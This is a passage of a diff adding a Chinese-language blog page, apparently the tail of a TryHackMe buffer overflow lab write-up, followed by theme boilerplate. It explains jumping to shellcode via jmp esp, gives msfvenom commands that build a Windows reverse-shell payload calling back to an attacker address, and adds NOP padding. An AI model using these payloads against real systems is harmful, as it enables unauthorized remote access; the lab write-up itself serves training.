class="hljs-built_in">esp</span>指令的地址，所以当<span class="hljs-built_in">eip</span>从栈顶一路到栈底，就会去执行<span class="hljs-keyword">jmp</span> <span class="hljs-built_in">esp</span>指令，而这个时候，<span class="hljs-built_in">esp</span>指向的地址恰好是父函数的栈顶，我们的shellcode是经过本地机发送并存储在目标的<span class="hljs-built_in">esp</span>寄存器中的，所以我们的shellcode将会被成功执行。<br></code></pre></td></tr></table></figure>
+
+<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.13.16.58 <span class="hljs-attribute">LPORT</span>=4444 <span class="hljs-attribute">EXITFUNC</span>=thread -b <span class="hljs-string">&quot;\x00\x07\x2e\xa0&quot;</span> -f c<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=10.13.16.58 <span class="hljs-attribute">LPORT</span>=4444 <span class="hljs-attribute">EXITFUNC</span>=thread -b <span class="hljs-string">&quot;坏字符&quot;</span> -f c<br></code></pre></td></tr></table></figure>
+
+<h4 id="前置-NOP"><a href="#前置-NOP" class="headerlink" title="前置 NOP"></a>前置 NOP</h4><p>padding &#x3D; “\x90” * 16</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">由于可能使用了编码器来生成有效载荷，因此我们还需要一些内存空间来让有效载荷自行解包；将<span class="hljs-attribute">padding</span>变量设置为 <span class="hljs-number">16</span> 个“No Operation”(\x90) 或更多的字符串——即至少添加 <span class="hljs-number">16</span> 个 NOP (\x90)在payload变量前：<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028023818737.png" srcset="/img/loading.gif" lazyload alt="image-20231028023818737"></p>
+<p>重启oscp.exe 发送payload 弹shelL</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>tryhackme_buffer_overflow</div>
+      <div>http://groundctl2majortom.github.io/2023/09/07/tryhackme-buffer-overflow/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>GroundCtl2MajorTom</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/01/tryhackme-wordpress-5-6-2/" title="tryhackme_wordpress_5.6.2">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">tryhackme_wordpress_5.6.2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/22/tryhackme-offensive-pentesting/" title="tryhackme_offensive_pentesting">
+                        <span class="hidden-mobile">tryhackme_offensive_pentesting</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
